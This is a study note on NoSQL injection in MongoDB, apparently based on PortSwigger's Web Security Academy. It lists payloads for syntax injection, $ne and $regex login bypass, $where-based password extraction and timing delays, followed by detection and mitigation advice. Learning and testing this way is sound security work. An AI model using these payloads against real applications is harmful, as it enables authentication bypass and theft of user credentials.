# NoSQL  

---

## Metadata  
- **OWASP Category (2021):** A03 Injection  
- **PortSwigger Link:** [NoSQL Injection | Web Security Academy](https://portswigger.net/web-security/nosql-injection)  

---

- **Sub-Topics:**  
  - Syntax Injection in MongoDB  
  - Operator Injection (e.g., `$ne`, `$gt`, `$regex`)  
  - Timing-based NoSQL injection  

---

## 💡 Concept  
- **What is it?**  
> - Interfering with the queries that an application makes to a NoSQL database  

- **Impact:**  
> - **Confidentiality:** Leak sensitive data (user records, tokens).  
> - **Integrity:** Modify or delete content.  
> - **Availability:** Denial of service via heavy `$where` queries or sleeps.  
> - **Advancement:** Potential escalation to server compromise if combined with unsafe eval or code execution features.  

---

## 🛠 Exploitation Notes  
- **Where to test:**  
> - Login forms, search filters, JSON APIs  
> - URL query strings and parameters (`?user=...`)  
> - HTTP request bodies (especially JSON)  

- **Payloads**  

**1. Syntax Injection**  
> - Fuzz strings to break syntax:  
>   ```
>   "}'" ({}) $foo || 1==1
>   ```  
> - Boolean logic test:  
>   ```
>   1 || 1==1
>   ```  
> - Detection by observing error messages or conditional changes  

**2. Operator Injection**  
> - Authentication bypass:  
>   ```json
>   { "username": {"$ne":""}, "password": {"$ne":""} }
>   ```  
> - Regex match:  
>   ```json
>   { "username": {"$regex":".*"}, "pwd":"" }
>   ```  
> - Injection via URL parameters:  
>   ```
>   username[$ne]=test&password[$ne]=test
>   ```  

**3. Data Extraction (Boolean / Conditional Logic)**  
> - Password length inference:  
>   ```
>   { "username":"admin", "pwd": {"$where":"this.password.length > 3"} }
>   ```  
> - Character-by-character brute force:  
>   ```
>   { "username":"admin", "pwd": {"$where":"this.password[0]=='a'"} }
>   ```  

**4. Timing / Blind Injection**  
> - Delays via `$where`:  
>   ```
>   { $where: "sleep(5000)" }
>   ```  

---

## 🔍 Detection  
- **How to identify in apps:**  
> - Inject syntax-breaking payloads (`'`, `"}`, `})`) to trigger errors.  
> - Use boolean logic tests to observe behavioral differences.  
> - Test regex and operator-based payloads for login bypass.  
> - Blind detection with `$where` + delay functions.  
> - Burp Suite Intruder  

---

## 🛡 Mitigation  
> - Sanitize and validate user input, using an allowlist of accepted characters  
> - Never let user input parameterize operators (instead of concatenating user input directly into queries)  
> - To prevent operator injection, apply an allowlist of accepted keys  

